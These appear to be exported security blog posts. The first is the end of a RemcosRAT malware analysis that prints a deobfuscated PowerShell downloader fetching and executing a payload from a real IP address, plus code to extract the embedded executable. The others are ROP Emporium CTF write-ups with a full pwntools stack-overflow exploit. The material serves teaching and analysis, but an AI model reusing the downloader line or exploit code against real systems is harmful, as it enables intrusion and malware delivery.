<span class="token keyword">var</span> yy<span class="token operator">=</span>r<span class="token punctuation">.</span><span class="token function">ShellExecute</span><span class="token punctuation">(</span><span class="token string">"powershell.exe"</span><span class="token punctuation">,</span><span class="token function">x0asd44</span><span class="token punctuation">(</span><span class="token stringspan><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">x0asd44</span><span class="token punctuation">(</span><span class="token parameter">hex</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> hex<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span> str <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>hex<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> str<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">/</span>msxsl<span class="token operator">:</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>xsl<span class="token operator">:</span>stylesheet<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>First decode the string we are passing to <strong>ActiveXObject</strong> function.</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">x0asd44</span><span class="token punctuation">(</span><span class="token parameter">hex</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> hex<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span>
    str <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>hex<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> str<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">x0asd44</span><span class="token punctuation">(</span><span class="token string">"5368656c6c2e4170706c69636174696f6e"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Executing the above javascript code, our hexstring string parameter is decoded to <code>Shell.Application</code>.</p>
<p>Below is the deobfuscated powershell script which is passed <code>shell.Application</code> as shown in the obsfucated script.</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token string">'[void] [System.Reflection.Assembly]::LoadWithPartialName(''Microsoft.VisualBasic'')'</span><span class="token punctuation">|</span><span class="token function">IEX</span><span class="token punctuation">;</span>
<span class="token variable">$t56fg</span> = <span class="token namespace">[Enum]</span>::ToObject<span class="token punctuation">(</span><span class="token namespace">[System.Net.SecurityProtocolType]</span><span class="token punctuation">,</span> 3072<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token namespace">[System.Net.ServicePointManager]</span>::SecurityProtocol = <span class="token variable">$t56fg</span><span class="token punctuation">;</span>
<span class="token keyword">do</span> <span class="token punctuation">&#123;</span><span class="token variable">$ping</span> = <span class="token function">test-connection</span> <span class="token operator">-</span>comp google<span class="token punctuation">.</span>com <span class="token operator">-</span>count 1 <span class="token operator">-</span>Quiet<span class="token punctuation">&#125;</span> <span class="token keyword">until</span> <span class="token punctuation">(</span><span class="token variable">$ping</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$tty</span>=<span class="token string">'(New-Object Net.WebClient)'</span><span class="token punctuation">|</span>I`E`X<span class="token punctuation">;</span>
<span class="token variable">$mv</span>= <span class="token namespace">[Microsoft.VisualBasic.Interaction]</span>::CallByname<span class="token punctuation">(</span><span class="token variable">$tty</span><span class="token punctuation">,</span><span class="token string">'DownloadString'</span><span class="token punctuation">,</span><span class="token namespace">[Microsoft.VisualBasic.CallType]</span>::Method<span class="token punctuation">,</span><span class="token string">'http://104.223.119.167/calient.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$r78fd000sd</span>= <span class="token variable">$mv</span> <span class="token operator">-</span>split <span class="token string">'%'</span> <span class="token punctuation">|</span><span class="token function">ForEach-Object</span> <span class="token punctuation">&#123;</span><span class="token namespace">[char]</span><span class="token namespace">[byte]</span><span class="token string">"0x<span class="token variable">$_</span>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token variable">$y5jh62df0</span>= I`E`X<span class="token punctuation">(</span><span class="token variable">$r78fd000sd</span> <span class="token operator">-join</span> <span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The deobfuscated powershell script above downloads another string at the domain highlighted above. The malware gets obsfuscated strings of the <code>calient.jpg</code> url.</p>
<h2 id="Stage3-Downloader-calient-jpg"><a href="#Stage3-Downloader-calient-jpg" class="headerlink" title="Stage3 - Downloader (calient.jpg)"></a>Stage3 - Downloader (calient.jpg)</h2><p>Stage two downloads third obfuscated script strings in calient.jpg url. String is obfuscated and is larger than second stage <code>atcn.jpg</code> string. Looking at the obfuscated strings we have an interesting string referenced by <code>ftIXfysfU</code> variable.</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">$y='[System.AppDomain]'|W0B4J;
$g55=$y.GetMethod("get_CurrentDomain")

 [String]$ftIXfysfU='4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300AF89D1610000000000000000E00002210B010800004402000048<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>The string above seems to be an executable. This is because of the header file magic of PE executable. The magic number <code>4D5A</code> or ASCII characters MZ represents the beginning of the file signature of Microsoft PE file.</p>
<p><img data-src="/images/mal/remcosrat/pehead.png" alt="Http filter"></p>
<p>The python script belows decoded the bytes and returs an PE executable.</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#convert bytearray to PE</span>
remcosPE<span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'4D5A90000300000004000000FFFc....'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'open.exe'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> filepe<span class="token punctuation">:</span>
    filepe<span class="token punctuation">.</span>write<span class="token punctuation">(</span>remcosPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Now we have a fully RemcosRat malware, which is a .NET family malware.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">remcosrat$ <span class="token function">file</span> open.exe
open.exe: PE32 executable <span class="token punctuation">(</span>DLL<span class="token punctuation">)</span> <span class="token punctuation">(</span>console<span class="token punctuation">)</span> Intel <span class="token number">80386</span> Mono/.Net assembly, <span class="token keyword">for</span> MS Windows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>Next step is analyzing dropped PE file.</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
<li><a href="https://www.malware-traffic-analysis.net/2022/01/04/index.html">https://www.malware-traffic-analysis.net/2022/01/04/index.html</a></li>
<li><a href="https://twitter.com/Unit42_Intel/status/1478744612516900868/">https://twitter.com/Unit42_Intel/status/1478744612516900868/</a></li>
</ol>
]]></content>
      <tags>
        <tag>Malware</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>RopEmporium split challenge</title>
    <url>/2021/12/17/ROP-Split/</url>
    <content><![CDATA[<p>The elements that allowed you to complete ret2win are still present, they’ve just been split apart. Find them and recombine them using a short ROP chain</p>
<span id="more"></span>

<p>The goal of this challenge is to understand how function arguments are passed in 64bit machine when doing return oriented programming. The binary can be downloaded from the authors website <a href="https://ropemporium.com/">ropemporium</a>.</p>
<p>First we check the binary protections enabled. Only <strong>NX</strong> (Not executable) is enabled on the device according to <code>checksec</code> binary utility as shown in the image below.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:split$ checksec --file<span class="token operator">=</span>split
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>For analysis of binary we use <code>gdb</code> to analyze the functions present in the binary in order to understand the logic. We disassemble <strong>pwnme</strong> function as shown in the image below.The function looks familiar as for the ret2win function.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(gdb) disas pwnme
Dump of assembler code for function pwnme:
   <span class="token number">0x00000000004006e8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span>:	push   <span class="token register variable">rbp</span>
   <span class="token number">0x00000000004006e9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
   <span class="token number">0x00000000004006ec</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span>:	sub    <span class="token register variable">rsp</span>,<span class="token number">0x20</span>
   <span class="token number">0x00000000004006f0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
   <span class="token number">0x00000000004006f4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">></span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x20</span>
   <span class="token number">0x00000000004006f9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">17</span><span class="token operator">></span>:	mov    <span class="token register variable">esi</span>,<span class="token number">0x0</span>
   <span class="token number">0x00000000004006fe</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">22</span><span class="token operator">></span>:	mov    <span class="token register variable">rdi</span>,<span class="token register variable">rax</span>
   <span class="token number">0x0000000000400701</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">25</span><span class="token operator">></span>:	call   <span class="token number">0x400580</span> <span class="token operator">&lt;</span>memset@plt<span class="token operator">></span>
   <span class="token number">0x0000000000400706</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x400810</span>
   <span class="token number">0x000000000040070b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">35</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
   <span class="token number">0x0000000000400710</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">40</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x40083c</span>
   <span class="token number">0x0000000000400715</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">45</span><span class="token operator">></span>:	mov    <span class="token register variable">eax</span>,<span class="token number">0x0</span>
   <span class="token number">0x000000000040071a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">50</span><span class="token operator">></span>:	call   <span class="token number">0x400570</span> <span class="token operator">&lt;</span>printf@plt<span class="token operator">></span>
   <span class="token number">0x000000000040071f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">55</span><span class="token operator">></span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
   <span class="token number">0x0000000000400723</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">59</span><span class="token operator">></span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x60</span>
   <span class="token number">0x0000000000400728</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span>:	mov    <span class="token register variable">rsi</span>,<span class="token register variable">rax</span>
   <span class="token number">0x000000000040072b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">67</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x0</span>
   <span class="token number">0x0000000000400730</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">72</span><span class="token operator">></span>:	call   <span class="token number">0x400590</span> <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>
   <span class="token number">0x0000000000400735</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">77</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x40083f</span>
   <span class="token number">0x000000000040073a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">82</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
   <span class="token number">0x000000000040073f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">87</span><span class="token operator">></span>:	nop
   <span class="token number">0x0000000000400740</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">88</span><span class="token operator">></span>:	leave
   <span class="token number">0x0000000000400741</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">89</span><span class="token operator">></span>:	ret
End of assembler dump.
(gdb)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From the above code, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. <strong>memset</strong> is used to overwrite any values that is present in the memory area specified. The memory region we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the boundary of base pointer address in the stack.</p>
<p><img data-src="/images/ropemporium/stack.png"></p>
<p>Next function is <strong>read</strong> function, which reads for user input from the standard input file descriptor and stores in specified buffer. From disassembled code, we are reading <strong>0x60</strong> bytes from the user input and storing it in our buffer. This means we are reading more than what the buffer can hold, therefore leading to stack buffer overflow.</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>For this challenge we don’t have a <code>ret2win</code> function which we are to return to. From the disassembly of the binary we have an interesting function called <strong>usefulFunction</strong> responsible for listing the files in the directory when called.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(gdb) disas usefulFunction
Dump of assembler code for function usefulFunction:
   <span class="token number">0x0000000000400742</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span>:	push   <span class="token register variable">rbp</span>
   <span class="token number">0x0000000000400743</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
   <span class="token number">0x0000000000400746</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x40084a</span>
   <span class="token number">0x000000000040074b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">9</span><span class="token operator">></span>:	call   <span class="token number">0x400560</span> <span class="token operator">&lt;</span>system@plt<span class="token operator">></span>
   <span class="token number">0x0000000000400750</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">14</span><span class="token operator">></span>:	nop
   <span class="token number">0x0000000000400751</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">15</span><span class="token operator">></span>:	pop    <span class="token register variable">rbp</span>
   <span class="token number">0x0000000000400752</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span>:	ret
End of assembler dump.
(gdb) x<span class="token operator">/</span>s <span class="token number">0x40084a</span>
<span class="token number">0x40084a</span>:	<span class="token string">"/bin/ls"</span>
(gdb)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Goal is to pass a different string to the <code>system</code> function instead of <strong>“&#x2F;bin&#x2F;ls”</strong></p>
<p>From the author’s hint, we can look for useful hints in the binary using either radare2.</p>
<blockquote>
<p>Now that you’ve gathered the elements of your exploit you can start to piece them together, you want to call system() with the <strong>“&#x2F;bin&#x2F;cat flag.txt”</strong> string as the only argument. You’ll also have to start dealing with the differences between the various architectures’ calling conventions.</p>
</blockquote>
<p>Analyzing binary using <code>radare2</code>, we can use <strong>iz</strong> command to look for strings. The goal is to read the flag from the system.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm"><span class="token operator">[</span><span class="token number">0x004005b0</span><span class="token operator">]</span><span class="token operator">></span> iz
nth paddr      vaddr      len size section type  string
<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
<span class="token number">0</span>   <span class="token number">0x000007e8</span> <span class="token number">0x004007e8</span> <span class="token number">21</span>  <span class="token number">22</span>   .rodata ascii split by ROP Emporium
<span class="token number">1</span>   <span class="token number">0x000007fe</span> <span class="token number">0x004007fe</span> <span class="token number">7</span>   <span class="token number">8</span>    .rodata ascii x86_64\n
<span class="token number">2</span>   <span class="token number">0x00000806</span> <span class="token number">0x00400806</span> <span class="token number">8</span>   <span class="token number">9</span>    .rodata ascii \nExiting
<span class="token number">3</span>   <span class="token number">0x00000810</span> <span class="token number">0x00400810</span> <span class="token number">43</span>  <span class="token number">44</span>   .rodata ascii Contriving a reason to ask user for data...
<span class="token number">4</span>   <span class="token number">0x0000083f</span> <span class="token number">0x0040083f</span> <span class="token number">10</span>  <span class="token number">11</span>   .rodata ascii Thank you<span class="token operator">!</span>
<span class="token number">5</span>   <span class="token number">0x0000084a</span> <span class="token number">0x0040084a</span> <span class="token number">7</span>   <span class="token number">8</span>    .rodata ascii <span class="token operator">/</span>bin<span class="token operator">/</span>ls
<span class="token number">0</span>   <span class="token number">0x00001060</span> <span class="token number">0x00601060</span> <span class="token number">17</span>  <span class="token number">18</span>   .data   ascii <span class="token operator">/</span>bin<span class="token operator">/</span>cat flag.txt
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>We have an important string <strong>“&#x2F;bin&#x2F;cat flag.txt”</strong> which will enable us to complete our goal. Now we need pass string to system function as follows <strong>system(‘&#x2F;bin&#x2F;cat flag.txt’)</strong>.</p>
<p>For building ropchain, we need to understand the calling conventions of <strong>AMD64 ABI</strong>.The calling convention passes the arguments to the registers in the following order <strong>RDI, RSI, RDX, RCX, R8 and R9</strong>.</p>
<p>Because the system function receives one argument, we need to look for one gadget t that we control <strong>rdi</strong> address.</p>
<p><strong>What are gadgets?</strong></p>
<p>Gadgets are sequence of instructions that end with <code>ret</code> instruction. Because we want to load a value into rdi register, we look for a pop <strong>pop rdi; ret</strong> instruction in order to pass an argument to <code>system</code>.</p>
<p>For searching gadget in radare2&#x2F;rizin, use <strong>&#x2F;R</strong> command as shown in the image below.</p>
<p><img data-src="/images/ropemporium/split_poprdi.png"><br>Now we need to chain ropchain exploit as shown in the image below.</p>
<p><img data-src="/images/ropemporium/popgadget.png" alt="ropchain"></p>
<p>The goal is to overwrite the return address with the address of <strong>“pop rdi, ret “</strong> and call system function. we need to fill the buffer memory with 32bytes, 8 bytes to overwrite the <code>rbp</code> address and 8 bytes to overwrite return address with pop rdi address.</p>
<p>Full exploit of split challenge is;</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pwn

pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"latin-1"</span>
pwn<span class="token punctuation">.</span>warnings<span class="token punctuation">.</span>simplefilter<span class="token punctuation">(</span><span class="token string">"ignore"</span><span class="token punctuation">)</span>
pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>

io <span class="token operator">=</span> pwn<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">"./split"</span><span class="token punctuation">)</span>

system_addr <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x400560</span><span class="token punctuation">)</span>   <span class="token comment">#address of system</span>
pop_rdi_ret <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x004007c3</span><span class="token punctuation">)</span>  <span class="token comment"># pop rdi; ret gadget</span>
bin_cat_addr <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x00601060</span><span class="token punctuation">)</span>  <span class="token comment">#bin cat flag.txt address</span>

payload <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">32</span>  <span class="token comment">#fill the buffer</span>
payload <span class="token operator">+=</span> <span class="token string">b"B"</span> <span class="token operator">*</span><span class="token number">8</span>   <span class="token comment"># overwrite  rbp</span>
payload <span class="token operator">+=</span> pop_rdi_ret <span class="token comment"># pop rdi gadget</span>
payload <span class="token operator">+=</span> bin_cat_addr <span class="token comment"># argument passed to the system function</span>
payload <span class="token operator">+=</span> system_addr   <span class="token comment">#call system</span>

io<span class="token punctuation">.</span>writeafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

pwn<span class="token punctuation">.</span>info<span class="token punctuation">(</span>io<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Running python3 code we get a flag.</p>
<p><img data-src="/images/ropemporium/split_flag.png"></p>
<blockquote>
<p><strong>To avoid the segmentation fault of the above, we can overwrite the rbp address with exit function address in order to exit without segfault.</strong></p>
</blockquote>
]]></content>
      <tags>
        <tag>ropemporium</tag>
        <tag>rop</tag>
      </tags>
  </entry>
  <entry>
    <title>ROPEmporium callme challenge</title>
    <url>/2021/12/20/ROP-callme/</url>
    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Challenge Description</p>
<p>The goal of the challenge is understanding how more than one argument is passed in x64 function. The challenge can be downloaded from the author&#96;s website <a href="https://ropemporium.com/">ropemporium</a></p>
<span id="more"></span>

<blockquote>
<p>Reliably make consecutive calls to imported functions.<br>Use some new techniques and learn about the Procedure Linkage Table.</p>
</blockquote>
<p>The program needs make consecutive calls to a function with three arguments in order to get a correct flag. The challenge description is similar to the split challenge.</p>
<blockquote>
<p><strong>You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)</strong></p>
</blockquote>
<p>check the binary protections enabled on the <code>callme</code> binary, only <strong>NX</strong>( Not Executable) is enabled on the binary as shown below.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:callme$ checksec --file callme
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
    RUNPATH:  b<span class="token string">'.'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Open <strong>callme</strong> binary in radare2 to look for exploitable vulnerability and examine the behavior. radare2 is a powerful disassembler&#x2F;debugging tool used for examining the behavior of programs.</p>
<p><img data-src="/images/ropemporium/callme_bug.png"></p>
<p>From the above image we use <strong>pdf</strong> command to disassemble a given function. Function <strong>pwnme</strong> looks similar to the previous challenges ret2win and split.</p>
<p>From the aDisassembled program, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. memset is used to overwrite any values that is present in the memory area specified. The memory area we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the address of base pointer in the stack.<br><img data-src="/images/ropemporium/stack.png"></p>
<p>Next function is read function, which reads for user input and stores in the allocated buffer.</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>From assembly code, we are reading <code>0x200</code> bytes from the standard input file descriptor and storing it in buffer, meaning we are reading more than what the buffer can hold therefore leading to a stack buffer overflow.</p>
<p>For exploitation stack overflow, fill the buffer, overwrite rbp register and control the return address with desired address.</p>
<p>Because the system function receives one argument, look for one gadgets that we control the rdi, rsi and rdx registers.</p>
